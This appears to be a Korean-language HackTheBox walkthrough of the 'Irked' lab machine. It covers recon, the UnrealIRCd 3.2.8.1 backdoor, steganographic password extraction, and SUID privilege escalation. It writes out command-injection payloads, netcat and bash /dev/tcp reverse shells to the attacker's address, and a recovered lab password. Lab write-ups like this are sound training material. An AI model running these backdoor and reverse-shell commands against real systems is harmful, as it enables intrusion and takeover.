# Irked - HackTheBox
## Recon
```bash
sudo nmap -p 111,22,59642,65534,6697,80,8067 -sC -sV -vv -oA Irked 10.10.10.117
```
<img width="1105" height="481" alt="image" src="https://github.com/user-attachments/assets/6c3ce673-6143-4554-ac42-59ad36075776" />
<img width="1105" height="308" alt="image" src="https://github.com/user-attachments/assets/808498ad-9765-4ce2-92df-48f23d84c9f6" />

- SSH(22)
- HTTP(80)
- IRC(6697)

---
## IRC
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-irc.html?highlight=unrealirc#find-and-scan-irc-services
- `IRC`에 접속해서 버전 확인.
- `Unreal 3.2.8.1`
```
nc -nv 10.10.10.117 6697

USER ran213eqdw123 0 * ran213eqdw123

NICK ran213eqdw123

VERSION
```
<img width="1105" height="516" alt="image" src="https://github.com/user-attachments/assets/7ab04cd5-28aa-4f6b-ab37-e116bcd331a1" />

<br>
<br>

- https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor
- `IRC`에 접속해서 페이로드를 전달하여 리버스 셸을 실행하는 코드.
<img width="650" height="462" alt="image" src="https://github.com/user-attachments/assets/e49755e3-6f7f-4e7e-8463-f1b88a9a0933" />

<br>
<br>

- ping test 시도.
```
AB; ping 10.10.16.3
```
<img width="1104" height="132" alt="image" src="https://github.com/user-attachments/assets/a3c9de17-9f25-4afd-9c43-241baee988bb" />

<br>
<br>

- ping test 성공.
<img width="1104" height="220" alt="image" src="https://github.com/user-attachments/assets/130e8a01-69b1-4b87-b037-8238b45447b6" />

<br>
<br>

- 리버스 셸 시도.
```
AB;nc 10.10.16.3 80 -e /bin/bash
```
<img width="1104" height="122" alt="image" src="https://github.com/user-attachments/assets/0d8e2381-9b92-4f9c-977e-2d261198c094" />

<br>
<br>

- 셸 획득.
<img width="1104" height="135" alt="image" src="https://github.com/user-attachments/assets/0e24e33e-df68-4bbb-8936-1dfa6397c179" />

---
## Privesc
- `/home/djmardov/Documents`폴더를 확인할 수 있고, `.backup`파일 읽기 가능.
<img width="1104" height="60" alt="image" src="https://github.com/user-attachments/assets/d34c5cad-9f3d-4273-a91f-a6b33f2ee995" />

<br>
<br>

- 서버의 메인페이지에서 이미지 파일 확인.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/281ef8e2-4a4b-4d70-8829-937481a81a34" />

<br>
<br>

- `steg`과 이미지를 통해서 스태가노그래피가 적용되었다 가정하고 추출을 시도.
```bash
steghide extract -sf irked.jpg --passphrase 'UPupDOWNdownLRlrBAbaSSss'
```
<img width="1104" height="143" alt="image" src="https://github.com/user-attachments/assets/2f4b1f3b-b21a-474c-9fb9-266bfa9407f6" />

<br>
<br>

- `djmardov:Kab6h+m+bbp2J:HG` 로그인.
<img width="1104" height="78" alt="image" src="https://github.com/user-attachments/assets/e12d7244-6006-42d2-b509-1bc70724bb97" />

<br>
<br>

- `/usr/bin/viewuser`에 SUID가 적용되어 있고, 해당 머신이 만들어진 연도와 같은 해에 생성.
<img width="1104" height="497" alt="image" src="https://github.com/user-attachments/assets/5fc4f3e6-771c-4af4-badd-1d780b636e6d" />

<br>
<br>

- 바이너리 파일을 `base64`로 인코딩.
```bash
cat /usr/bin/viewuser|base64 -w0
```
<img width="1104" height="497" alt="image" src="https://github.com/user-attachments/assets/bbbcbf8a-cd08-4f06-9121-54852253422b" />

<br>
<br>

- 인코딩된 문자들을 복사하여 로컬에서 `base64`로 디코딩.
```bash
cat viewuser.txt|base64 -d > viewuser
```
<img width="1104" height="150" alt="image" src="https://github.com/user-attachments/assets/6c1fa524-6dfb-45c0-8495-ea0dabb3f3c0" />

<br>
<br>

- `ltrace`로 바이너리 파일 분석.
- `/tmp/listusers`를 실행하는 코드.
```bash
chmod +x viewuser

ltrace ./viewuser
```
<img width="1104" height="409" alt="image" src="https://github.com/user-attachments/assets/aa65ccda-788b-49af-a773-1413520d23a0" />

<br>
<br>

- `/tmp/listusers`를 생성하고 리버스 셸 명령어 추가하여 `/usr/bin/viewuser`실행.
```bash
touch /tmp/listusers

echo 'bash -c "bash -i >&/dev/tcp/10.10.16.3/80 0>&1"' >> listusers

chmod +x listusers

/usr/bin/viewuser
```
<img width="1104" height="153" alt="image" src="https://github.com/user-attachments/assets/0f864e0a-874a-4d8e-8486-cc18b8b9df0e" />

<br>
<br>

- 셸 획득.
<img width="1104" height="139" alt="image" src="https://github.com/user-attachments/assets/25d84b63-6057-4135-9fc3-947811b732a3" />

---
## FLAG
- `/home/djmardov/user.txt`
<img width="1104" height="516" alt="image" src="https://github.com/user-attachments/assets/88127931-1b4d-43fa-a53f-07885c2ffb7c" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="195" alt="image" src="https://github.com/user-attachments/assets/114d1fef-d472-4b28-88ba-9ebc06289660" />
